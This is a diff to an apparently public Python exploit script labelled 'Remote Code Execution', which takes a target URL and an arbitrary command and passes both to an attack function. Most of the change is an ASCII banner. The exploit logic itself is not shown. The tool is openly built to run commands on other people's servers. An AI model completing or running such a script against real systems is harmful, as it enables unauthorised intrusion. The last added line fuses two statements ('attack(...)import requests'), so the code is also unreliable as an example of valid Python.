@@ -5,6 +5,26 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
+print(
+    """
+    
+                             ____                      _          ____          _      
+                            |  _ \ ___ _ __ ___   ___ | |_ ___   / ___|___   __| | ___ 
+                            | |_) / _ \ '_ ` _ \ / _ \| __/ _ \ | |   / _ \ / _` |/ _ |
+                            |  _ <  __/ | | | | | (_) | ||  __/ | |__| (_) | (_| |  __/
+                            |_| \_\___|_| |_| |_|\___/ \__\___|  \____\___/ \__,_|\___|
+                                                                               
+                             _____                     _   _               ~>Remote Code Execution<~
+                            | ____|_  _____  ___ _   _| |_(_) ___  _ __   ~~>Made by tfwcodes(github)<~~
+                            |  _| \ \/ / _ \/ __| | | | __| |/ _ \| '_ \ 
+                            | |___ >  <  __/ (__| |_| | |_| | (_) | | | |
+                            |_____/_/\_\___|\___|\__,_|\__|_|\___/|_| |_|
+                                             
+                            
+    
+    """
+)
+
 def check_url(url):
     try:
         s2 = requests.session()
@@ -40,4 +60,4 @@ url_rce = input("[+] Enter the target url: ")
 check_url(url_rce)
 
 command_rce = input("[+] Enter the command to execute: ")
-attack(url_rce, command_rce)
+attack(url_rce, command_rce)import requests
